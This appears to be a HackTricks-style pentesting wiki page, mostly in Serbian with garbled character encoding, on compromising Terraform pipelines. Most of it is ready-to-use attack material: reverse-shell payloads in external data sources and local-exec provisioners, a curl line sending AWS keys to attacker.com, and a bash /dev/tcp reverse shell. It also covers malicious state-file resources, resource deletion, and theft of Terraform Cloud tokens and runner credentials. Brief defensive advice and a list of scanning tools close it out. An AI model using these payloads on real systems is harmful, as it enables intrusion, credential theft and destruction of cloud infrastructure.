# Terraform sigurnost

{{#include ../banners/hacktricks-training.md}}

## Osnovne informacije

[Iz dokumentacije:](https://developer.hashicorp.com/terraform/intro)

HashiCorp Terraform je alat za infrastrukturu kao kod koji vam omoguÄ‡ava da definiÅ¡ete i cloud i on-prem resurse u ljudski Äitljivim konfiguracionim fajlovima koje moÅ¾ete verzionisati, ponovo koristiti i deliti. Zatim moÅ¾ete koristiti konzistentan workflow da obezbedite i upravljate svojom infrastrukturom kroz ceo njen Å¾ivotni ciklus. Terraform moÅ¾e da upravlja niskonivo komponentama kao Å¡to su compute, storage i networking resursi, kao i visokog nivoa komponentama kao Å¡to su DNS unosi i SaaS funkcionalnosti.

#### Kako Terraform radi?

Terraform kreira i upravlja resursima na cloud platformama i drugim servisima preko njihovih application programming interfaces (APIs). Providers omoguÄ‡avaju Terraformu da radi sa gotovo bilo kojom platformom ili servisom koji ima dostupno API.

![](<../images/image (177).png>)

HashiCorp i Terraform zajednica su veÄ‡ napisali viÅ¡e od 1700 providera za upravljanje hiljadama razliÄitih tipova resursa i servisa, i taj broj nastavlja da raste. Sve javno dostupne providere moÅ¾ete naÄ‡i na [Terraform Registry](https://registry.terraform.io/), ukljuÄujuÄ‡i Amazon Web Services (AWS), Azure, Google Cloud Platform (GCP), Kubernetes, Helm, GitHub, Splunk, DataDog, i mnoge druge.

Osnovni Terraform workflow se sastoji iz tri faze:

- **Write:** DefiniÅ¡ete resurse, koji mogu biti rasporeÄ‘eni preko viÅ¡e cloud providera i servisa. Na primer, moÅ¾ete napraviti konfiguraciju za deploy aplikacije na virtualnim maÅ¡inama u Virtual Private Cloud (VPC) mreÅ¾i sa security grupama i load balancer-om.
- **Plan:** Terraform kreira execution plan koji opisuje infrastrukturu koju Ä‡e kreirati, aÅ¾urirati ili uniÅ¡titi na osnovu postojeÄ‡e infrastrukture i vaÅ¡e konfiguracije.
- **Apply:** Nakon odobrenja, Terraform izvrÅ¡ava predloÅ¾ene operacije u ispravnom redosledu, poÅ¡tujuÄ‡i zavisnosti resursa. Na primer, ako aÅ¾urirate svojstva VPC-a i promenite broj virtuelnih maÅ¡ina u tom VPC-u, Terraform Ä‡e ponovo kreirati VPC pre nego Å¡to skalira virtuelne maÅ¡ine.

![](<../images/image (215).png>)

### Terraform Lab

Samo instalirajte terraform na svoj raÄunar.

Evo vam [guide](https://learn.hashicorp.com/tutorials/terraform/install-cli) i ovde imate [best way to download terraform](https://www.terraform.io/downloads).

## RCE in Terraform: config file poisoning

Terraform **nema platformu koja izlaÅ¾e web stranicu ili mreÅ¾nu uslugu** koju moÅ¾emo enumerisati, stoga je jedini naÄin da kompromitujemo terraform moguÄ‡nost da dodamo/izmenimo terraform konfiguracione fajlove ili moguÄ‡nost da izmenimo terraform state fajl (vidi poglavlje niÅ¾e).

MeÄ‘utim, terraform je **veoma osetljiva komponenta** za kompromitovanje jer Ä‡e imati **privilegovan pristup** razliÄitim lokacijama da bi pravilno radio.

Glavni naÄin da napadaÄ kompromituje sistem gde terraform radi je da **kompromituje repozitorijum koji Äuva terraform konfiguracije**, jer Ä‡e se te konfiguracije u nekom trenutku **interpretirati**.

U stvari, postoje reÅ¡enja koja **automatski izvrÅ¡avaju terraform plan/apply nakon Å¡to se kreira PR**, kao Å¡to je **Atlantis**:

{{#ref}}
atlantis-security.md
{{#endref}}

Ako moÅ¾ete kompromitovati terraform fajl, postoje razliÄiti naÄini da izvedete RCE kada neko izvrÅ¡i `terraform plan` ili `terraform apply`.

### Terraform plan

Terraform plan je **najÄeÅ¡Ä‡e koriÅ¡Ä‡ena komanda** u terraformu i developeri/solucije koje koriste terraform je Äesto pozivaju, tako da je **najnajlakÅ¡i naÄin da dobijete RCE** da se postarate da unesete otrov u terraform config fajl koji Ä‡e izvrÅ¡iti proizvoljne komande u `terraform plan`.

**KoriÅ¡Ä‡enje external providera**

Terraform nudi [`external` provider](https://registry.terraform.io/providers/hashicorp/external/latest/docs) koji obezbeÄ‘uje naÄin interfejsa izmeÄ‘u Terraforma i eksternih programa. MoÅ¾ete koristiti `external` data source da pokrenete proizvoljan kod tokom `plan`.

Ubacivanje u terraform konfiguracioni fajl neÄega kao sledeÄ‡e Ä‡e izvrÅ¡iti rev shell prilikom izvrÅ¡avanja `terraform plan`:
```javascript
data "external" "example" {
program = ["sh", "-c", "curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh"]
}
```
**KoriÅ¡Ä‡enje custom providera**

NapadaÄ moÅ¾e poslati [custom provider](https://learn.hashicorp.com/tutorials/terraform/provider-setup) na [Terraform Registry](https://registry.terraform.io/) i zatim ga dodati u Terraform kod u feature branch ([example from here](https://alex.kaskaso.li/post/terraform-plan-rce)):
```javascript
terraform {
required_providers {
evil = {
source  = "evil/evil"
version = "1.0"
}
}
}

provider "evil" {}
```
Provider se preuzima pri `init` i pokrenuÄ‡e maliciozni kod kada se izvrÅ¡i `plan`

MoÅ¾ete pronaÄ‡i primer na [https://github.com/rung/terraform-provider-cmdexec](https://github.com/rung/terraform-provider-cmdexec)

**KoriÅ¡Ä‡enje spoljne reference**

Obe pomenute opcije su korisne, ali nisu previÅ¡e diskretne (druga je diskretnija, ali sloÅ¾enija od prve). MoÅ¾ete izvesti ovaj napad i na joÅ¡ **neupadljiviji naÄin**, prateÄ‡i ove predloge:

- Umesto dodavanja rev shell direktno u terraform fajl, moÅ¾ete **uÄitati spoljaÅ¡nji resurs** koji sadrÅ¾i rev shell:
```javascript
module "not_rev_shell" {
source = "git@github.com:carlospolop/terraform_external_module_rev_shell//modules"
}
```
MoÅ¾ete pronaÄ‡i rev shell code na [https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules](https://github.com/carlospolop/terraform_external_module_rev_shell/tree/main/modules)

- U spoljnjem resursu, koristite **ref** funkciju da sakrijete **terraform rev shell code in a branch** unutar repoa, neÅ¡to poput: `git@github.com:carlospolop/terraform_external_module_rev_shell//modules?ref=b401d2b`

### Terraform Apply

Terraform apply Ä‡e biti izvrÅ¡en da primeni sve izmene; moÅ¾ete ga takoÄ‘e zloupotrebiti da dobijete RCE injektovanjem **zlonamernog Terraform fajla sa** [**local-exec**](https://www.terraform.io/docs/provisioners/local-exec.html).\
Samo treba da se postarate da neki payload poput sledeÄ‡ih zavrÅ¡i u fajlu `main.tf`:
```json
// Payload 1 to just steal a secret
resource "null_resource" "secret_stealer" {
provisioner "local-exec" {
command = "curl https://attacker.com?access_key=$AWS_ACCESS_KEY&secret=$AWS_SECRET_KEY"
}
}

// Payload 2 to get a rev shell
resource "null_resource" "rev_shell" {
provisioner "local-exec" {
command = "sh -c 'curl https://reverse-shell.sh/8.tcp.ngrok.io:12946 | sh'"
}
}
```
Pratite **predloge iz prethodne tehnike** da ovaj napad izvedete na **diskretniji naÄin koristeÄ‡i eksterne reference**.

## Ispis tajni

MoÅ¾ete naterati da se **tajne vrednosti koje koristi terraform ispiÅ¡u** pokretanjem `terraform apply` tako Å¡to Ä‡ete u terraform fajl dodati neÅ¡to poput:
```json
output "dotoken" {
value = nonsensitive(var.do_token)
}
```
## Zloupotreba Terraform state datoteka

U sluÄaju da imate write access nad terraform state datotekama ali ne moÅ¾ete da menjate terraform kod, [**this research**](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/) daje neke zanimljive opcije za iskoriÅ¡Ä‡avanje te datoteke. ÄŒak i ako biste imali write access nad config files, koriÅ¡Ä‡enje vektora state datoteka je Äesto mnogo prikrivenije, jer ne ostavljate tragove u `git` istoriji.

### RCE in Terraform: config file poisoning

It is possible to [create a custom provider](https://developer.hashicorp.com/terraform/tutorials/providers-plugin-framework/providers-plugin-framework-provider) and just replace one of the providers in the terraform state file for the malicious one or add a fake resource referencing the malicious provider.

The provider [statefile-rce](https://registry.terraform.io/providers/offensive-actions/statefile-rce/latest) builds on the research and weaponizes this principle. You can add a fake resource and state the arbitrary bash command you want to run in the attribute `command`. When the `terraform` run is triggered, this will be read and executed in both the `terraform plan` and `terraform apply` steps. In case of the `terraform apply` step, `terraform` will delete the fake resource from the state file after executing your command, cleaning up after itself. More information and a full demo can be found in the [GitHub repository hosting the source code for this provider](https://github.com/offensive-actions/terraform-provider-statefile-rce).

To use it directly, just include the following at any position of the `resources` array and customize the `name` and the `command` attributes:
```json
{
"mode": "managed",
"type": "rce",
"name": "<arbitrary_name>",
"provider": "provider[\"registry.terraform.io/offensive-actions/statefile-rce\"]",
"instances": [
{
"schema_version": 0,
"attributes": {
"command": "<arbitrary_command>",
"id": "rce"
},
"sensitive_attributes": [],
"private": "bnVsbA=="
}
]
}
```
Zatim, Äim se `terraform` izvrÅ¡i, vaÅ¡ kod Ä‡e se pokrenuti.

### Brisanje resursa <a href="#deleting-resources" id="deleting-resources"></a>

Postoje 2 naÄina da uniÅ¡tite resurse:

1. **Ubaci resurs sa sluÄajnim imenom u state file koji pokazuje na pravi resurs koji treba uniÅ¡titi**

PoÅ¡to Ä‡e `terraform` videti da taj resurs ne bi trebalo da postoji, uniÅ¡tiÄ‡e ga (prateÄ‡i navedeni realni resource ID). Primer sa prethodne strane:
```json
{
"mode": "managed",
"type": "aws_instance",
"name": "example",
"provider": "provider[\"registry.terraform.io/hashicorp/aws\"]",
"instances": [
{
"attributes": {
"id": "i-1234567890abcdefg"
}
}
]
},
```
2. **Izmenite resurs da bude obrisan na naÄin koji onemoguÄ‡ava aÅ¾uriranje (tako Ä‡e biti izbrisan i ponovo kreiran)**

Za EC2 instance, promena tipa instance je dovoljna da terraform izbriÅ¡e i ponovo kreira instancu.

### Zamenite provajdera koji je stavljen na crnu listu

Ako naiÄ‘ete na situaciju u kojoj je `hashicorp/external` stavljen na crnu listu, moÅ¾ete ponovo implementirati `external` provajder na sledeÄ‡i naÄin. Napomena: Koristimo fork external providera objavljen na https://registry.terraform.io/providers/nazarewk/external/latest. MoÅ¾ete i vi objaviti sopstveni fork ili ponovnu implementaciju.
```terraform
terraform {
required_providers {
external = {
source  = "nazarewk/external"
version = "3.0.0"
}
}
}
```
Zatim moÅ¾ete koristiti `external` kao i obiÄno.
```terraform
data "external" "example" {
program = ["sh", "-c", "whoami"]
}
```
## Terraform Cloud speculative plan RCE and credential exfiltration

- Preduslovi:
- Ukradite Terraform Cloud token sa developerske maÅ¡ine. CLI Äuva tokene u plaintext-u na `~/.terraform.d/credentials.tfrc.json`.
- Token mora imati pristup ciljnoj organizaciji/workspace-u i najmanje `plan` dozvolu. VCS-backed workspaces blokiraju `apply` iz CLI, ali i dalje dozvoljavaju speculative plans.

- Otkrivanje workspace i VCS podeÅ¡avanja putem TFC API-ja:
```bash
export TF_TOKEN=<stolen_token>
curl -s -H "Authorization: Bearer $TF_TOKEN" \
https://app.terraform.io/api/v2/organizations/<org>/workspaces/<workspace> | jq
```
- Pokrenite izvrÅ¡avanje koda tokom spekulativnog plana koristeÄ‡i external data source i Terraform Cloud "cloud" block kako biste ciljali VCS-backed workspace:
```hcl
terraform {
cloud {
organization = "acmecorp"
workspaces { name = "gcp-infra-prod" }
}
}

data "external" "exec" {
program = ["bash", "./rsync.sh"]
}
```
Primer rsync.sh za dobijanje reverse shell na TFC runner:
```bash
#!/usr/bin/env bash
bash -c 'exec bash -i >& /dev/tcp/attacker.com/19863 0>&1'
```
Pokreni spekulativni plan za izvrÅ¡avanje programa na ephemeral runner-u:
```bash
terraform init
terraform plan
```
- Enumerate and exfiltrate injected cloud credentials sa runnera. Tokom izvrÅ¡avanja, TFC injects provider credentials putem fajlova i environment variables:
```bash
env | grep -i gcp || true
env | grep -i aws || true
```
OÄekivani fajlovi u radnom direktorijumu runner-a:
- GCP:
- `tfc-google-application-credentials` (Workload Identity Federation JSON konfiguracija)
- `tfc-gcp-token` (kratkotrajni GCP access token)
- AWS:
- `tfc-aws-shared-config` (web identity/OIDC role assumption konfiguracija)
- `tfc-aws-token` (kratkotrajni token; neke organizacije mogu koristiti statiÄke kljuÄeve)

- Koristite kratkotrajne kredencijale out-of-band da zaobiÄ‘ete VCS gates:

GCP (gcloud):
```bash
export GOOGLE_APPLICATION_CREDENTIALS=./tfc-google-application-credentials
gcloud auth login --cred-file="$GOOGLE_APPLICATION_CREDENTIALS"
gcloud config set project <PROJECT_ID>
```
AWS (AWS CLI):
```bash
export AWS_CONFIG_FILE=./tfc-aws-shared-config
export AWS_PROFILE=default
aws sts get-caller-identity
```
Sa ovim creds, attackers mogu create/modify/destroy resources direktno koristeÄ‡i native CLIs, zaobilazeÄ‡i PR-based workflows koji blokiraju `apply` via VCS.

- Odbrambene smernice:
- Apply least privilege to TFC users/teams and tokens. Audit memberships and avoid oversized owners.
- OgraniÄite `plan` permission na osetljivim VCS-backed workspaces gde je izvodljivo.
- Enforce provider/data source allowlists with Sentinel policies to block `data "external"` or unknown providers. See HashiCorp guidance on provider filtering.
- Prefer OIDC/WIF over static cloud credentials; treat runners as sensitive. Monitor speculative plan runs and unexpected egress.
- Detect exfiltration of `tfc-*` credential artifacts and alert on suspicious `external` program usage during plans.


## Kompromitovanje Terraform Cloud

### Using a token

Kao **[explained in this post](https://www.pentestpartners.com/security-blog/terraform-token-abuse-speculative-plan/)**, terraform CLI stores tokens in plaintext at **`~/.terraform.d/credentials.tfrc.json`**. KraÄ‘a ovog tokena omoguÄ‡ava napadaÄu da se predstavlja kao korisnik u okviru opsega tokena.

Using this token it's possible to get the org/workspace with:
```bash
GET https://app.terraform.io/api/v2/organizations/acmecorp/workspaces/gcp-infra-prod
Authorization: Bearer <TF_TOKEN>
```
Tada je moguÄ‡e pokrenuti proizvoljan kod koristeÄ‡i **`terraform plan`**, kao objaÅ¡njeno u prethodnom poglavlju.

### Escaping to the cloud

Ako se runner nalazi u nekom cloud okruÅ¾enju, moguÄ‡e je dobiti token principala vezanog za runner i koristiti ga izvan kanala (out of band).

- **GCP files (present in current run working directory)**
- `tfc-google-application-credentials` â€” JSON config for Workload Identity Federation(WIF) that tells Google how to exchange the external identity.
- `tfc-gcp-token` â€” shortâ€‘lived (â‰ˆ1 hour) GCP access token referenced by the above

- **AWS files**
- `tfc-aws-shared-config` â€” JSON for web identity federation/OIDC role assumption
(preferred over static keys).
- `tfc-aws-token` â€” shortâ€‘lived token, or potentially static IAM keys if misconfigured.


## Automatic Audit Tools

### [**Snyk Infrastructure as Code (IaC)**](https://snyk.io/product/infrastructure-as-code-security/)

Snyk nudi sveobuhvatno reÅ¡enje za skeniranje Infrastructure as Code (IaC) koje otkriva ranjivosti i pogreÅ¡ne konfiguracije u Terraform, CloudFormation, Kubernetes i drugim IaC formatima.

- **Features:**
- Skeniranje u realnom vremenu za bezbednosne ranjivosti i probleme usklaÄ‘enosti.
- Integracija sa sistemima za verzionisanje (GitHub, GitLab, Bitbucket).
- Automatski pull requestovi sa ispravkama.
- Detaljni saveti za sanaciju.
- **Sign Up:** Create an account on [Snyk](https://snyk.io/).
```bash
brew tap snyk/tap
brew install snyk
snyk auth
snyk iac test /path/to/terraform/code
```
### [Checkov](https://github.com/bridgecrewio/checkov) <a href="#install-checkov-from-pypi" id="install-checkov-from-pypi"></a>

**Checkov** je alat za statiÄku analizu koda za infrastructure as code (IaC) i takoÄ‘e alat za Software Composition Analysis (SCA) za image-ove i open source pakete.

Skenera pregledava cloud infrastrukturu postavljenu pomoÄ‡u [Terraform](https://terraform.io/), [Terraform plan](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Terraform%20Plan%20Scanning.md), [Cloudformation](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Cloudformation.md), [AWS SAM](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/AWS%20SAM.md), [Kubernetes](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Kubernetes.md), [Helm charts](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Helm.md), [Kustomize](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Kustomize.md), [Dockerfile](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Dockerfile.md), [Serverless](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Serverless%20Framework.md), [Bicep](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Bicep.md), [OpenAPI](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/OpenAPI.md), [ARM Templates](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Azure%20ARM%20templates.md), Ğ¸Ğ»Ğ¸ [OpenTofu](https://opentofu.org/) Ğ¸ otkriva security i compliance misconfigurations koristeÄ‡i skeniranje zasnovano na grafovima.

Izvodi [Software Composition Analysis (SCA) scanning](https://github.com/bridgecrewio/checkov/blob/main/docs/7.Scan%20Examples/Sca.md), Å¡to je skeniranje open source paketa i image-ova radi pronalaÅ¾enja Common Vulnerabilities and Exposures (CVEs).
```bash
pip install checkov
checkov -d /path/to/folder
```
### [terraform-compliance](https://github.com/terraform-compliance/cli)

From the [**docs**](https://github.com/terraform-compliance/cli): `terraform-compliance` je lagan, na sigurnost i usklaÄ‘enost fokusiran test okvir za terraform koji omoguÄ‡ava negativno testiranje vaÅ¡e infrastrukture kao koda.

- **usklaÄ‘enost:** Osigurava da implementirani kod prati sigurnosne standarde i vaÅ¡e sopstvene prilagoÄ‘ene standarde
- **razvoj voÄ‘en ponaÅ¡anjem (BDD):** Imamo BDD za skoro sve, zaÅ¡to ne i za IaC?
- **prenosiv:** jednostavno instalirajte iz `pip` ili ga pokrenite preko `docker`. Pogledajte [Installation](https://terraform-compliance.com/pages/installation/)
- **pre-deploy:** validira vaÅ¡ kod pre nego Å¡to se rasporedi
- **lako za integraciju:** moÅ¾e se pokrenuti u vaÅ¡em pipeline-u (ili u git hook-ovima) kako bi se osiguralo da su sve implementacije validirane.
- **razdvajanje duÅ¾nosti:** moÅ¾ete Äuvati testove u drugom repozitorijumu gde je odgovoran poseban tim.

> [!NOTE]
> NaÅ¾alost, ako kod koristi neke providere kojima nemate pristup, neÄ‡ete moÄ‡i da izvrÅ¡ite `terraform plan` i pokrenete ovaj alat.
```bash
pip install terraform-compliance
terraform plan -out=plan.out
terraform-compliance -f /path/to/folder
```
### [tfsec](https://github.com/aquasecurity/tfsec)

Prema [**docs**](https://github.com/aquasecurity/tfsec): tfsec koristi statiÄku analizu vaÅ¡eg terraform koda da otkrije potencijalne greÅ¡ke u konfiguraciji.

- â˜ï¸ Proverava greÅ¡ke u konfiguraciji kod svih glavnih (i nekih manjih) cloud provajdera
- â›” Stotine ugraÄ‘enih pravila
- ğŸª† Skenira module (lokalne i udaljene)
- â• Analizira HCL izraze i literalne vrednosti
- â†ªï¸ Analizira Terraform funkcije npr. `concat()`
- ğŸ”— Analizira odnose izmeÄ‘u Terraform resursa
- ğŸ§° Kompatibilan sa Terraform CDK
- ğŸ™… Primenjuje (i obogaÄ‡uje) korisniÄki definisane Rego politike
- ğŸ“ƒ PodrÅ¾ava viÅ¡e izlaznih formata: lovely (podrazumevano), JSON, SARIF, CSV, CheckStyle, JUnit, text, Gif.
- ğŸ› ï¸ Konfigurisano (putem CLI flagova i/ili config fajla)
- âš¡ Veoma brzo â€” sposoban da brzo skenira ogromne repozitorijume
```bash
brew install tfsec
tfsec /path/to/folder
```
### [terrascan](https://github.com/tenable/terrascan)

Terrascan je statiÄki analizator koda za Infrastructure as Code. Terrascan vam omoguÄ‡ava da:

- Besprekorno skenirate Infrastructure as Code radi pogreÅ¡nih konfiguracija.
- Nadzirete postavljenu cloud infrastrukturu zbog promena u konfiguraciji koje uvode posture drift i omoguÄ‡avate vraÄ‡anje na bezbedno stanje.
- Otkrivate sigurnosne ranjivosti i krÅ¡enja usklaÄ‘enosti.
- UblaÅ¾avate rizike pre postavljanja cloud native infrastrukture.
- Nudi fleksibilnost da ga pokrenete lokalno ili integriÅ¡ete sa vaÅ¡im CI\CD.
```bash
brew install terrascan
terrascan scan -d /path/to/folder
```
### [KICKS](https://github.com/Checkmarx/kics)

PronaÄ‘ite sigurnosne ranjivosti, probleme sa usklaÄ‘enoÅ¡Ä‡u i pogreÅ¡ne konfiguracije infrastrukture rano u razvojnom ciklusu vaÅ¡e infrastrukture kao koda koristeÄ‡i **KICS** kompanije Checkmarx.

**KICS** predstavlja skraÄ‡enicu od **K**eeping **I**nfrastructure as **C**ode **S**ecure, open source je i obavezna alatka za svaki cloud-native projekat.
```bash
docker run -t -v $(pwd):/path checkmarx/kics:latest scan -p /path -o "/path/"
```
### [Terrascan](https://github.com/tenable/terrascan)

Prema [**docs**](https://github.com/tenable/terrascan): Terrascan je statiÄki analizator koda za infrastrukturu kao kod. Terrascan vam omoguÄ‡ava:

- Besprekorno skeniranje infrastrukture kao koda radi pogreÅ¡nih konfiguracija.
- PraÄ‡enje provisionirane cloud infrastrukture zbog promena konfiguracije koje uvode posture drift i omoguÄ‡avanje vraÄ‡anja na bezbednu konfiguraciju.
- Otkrivanje sigurnosnih ranjivosti i krÅ¡enja usklaÄ‘enosti.
- UblaÅ¾avanje rizika pre provisioniranja cloud-native infrastrukture.
- Fleksibilnost za pokretanje lokalno ili integraciju sa vaÅ¡im CI\CD.
```bash
brew install terrascan
```
## Reference

- [Atlantis Security](atlantis-security.md)
- [https://alex.kaskaso.li/post/terraform-plan-rce](https://alex.kaskaso.li/post/terraform-plan-rce)
- [https://developer.hashicorp.com/terraform/intro](https://developer.hashicorp.com/terraform/intro)
- [https://blog.plerion.com/hacking-terraform-state-privilege-escalation/](https://blog.plerion.com/hacking-terraform-state-privilege-escalation/)
- [https://github.com/offensive-actions/terraform-provider-statefile-rce](https://github.com/offensive-actions/terraform-provider-statefile-rce)
- [Terraform Cloud token abuse turns speculative plan into remote code execution](https://www.pentestpartners.com/security-blog/terraform-token-abuse-speculative-plan/)
- [Terraform Cloud permissions](https://developer.hashicorp.com/terraform/cloud-docs/users-teams-organizations/permissions)
- [Terraform Cloud API â€“ Show workspace](https://developer.hashicorp.com/terraform/cloud-docs/api-docs/workspaces#show-workspace)
- [AWS provider configuration](https://registry.terraform.io/providers/hashicorp/aws/latest/docs#provider-configuration)
- [AWS CLI â€“ OIDC role assumption](https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-role.html#cli-configure-role-oidc)
- [GCP provider â€“ Using Terraform Cloud](https://registry.terraform.io/providers/hashicorp/google/latest/docs/guides/provider_reference.html#using-terraform-cloud)
- [Terraform â€“ Sensitive variables](https://developer.hashicorp.com/terraform/tutorials/configuration-language/sensitive-variables)
- [Snyk Labs â€“ Gitflops: dangers of Terraform automation platforms](https://labs.snyk.io/resources/gitflops-dangers-of-terraform-automation-platforms/)

{{#include ../banners/hacktricks-training.md}}
